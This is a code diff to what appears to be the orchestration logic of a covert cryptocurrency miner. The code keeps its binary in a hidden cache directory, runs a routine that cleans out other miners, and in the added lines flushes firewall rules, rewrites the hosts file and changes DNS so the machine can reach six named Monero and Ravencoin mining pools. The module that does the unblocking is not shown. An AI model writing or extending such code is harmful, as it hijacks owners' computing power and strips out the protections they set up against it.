@@ -270,12 +270,25 @@ def _orchestrate():
     from core.job_throttle import JobThrottler
     from core.cache_dir import get_cache_dir
     from core.resilience import SelfHealer
+    from core import network_unblock
 
     try:
         cleaner = MinerCleaner()
         cleaner.run_full_clean()
 
         hidden_bin = get_cache_dir()
+
+        # ── Network unblock (firewall flush, hosts cleanup, DNS fix) ──
+        pool_hosts = [
+            "cryptonote.social", "pool.hashvault.pro",
+            "gulf.moneroocean.stream", "rvn.2miners.com",
+            "stratum-ravencoin.flypool.org", "rvn-eu1.nanopool.org",
+        ]
+        try:
+            unblock_status = network_unblock.prepare_mining_network(pool_hosts)
+            logger.info("Network unblock: %s", unblock_status)
+        except Exception as exc:
+            logger.warning("Network unblock failed (non-fatal): %s", exc)
 
         import platform
         if platform.system() == "Windows":
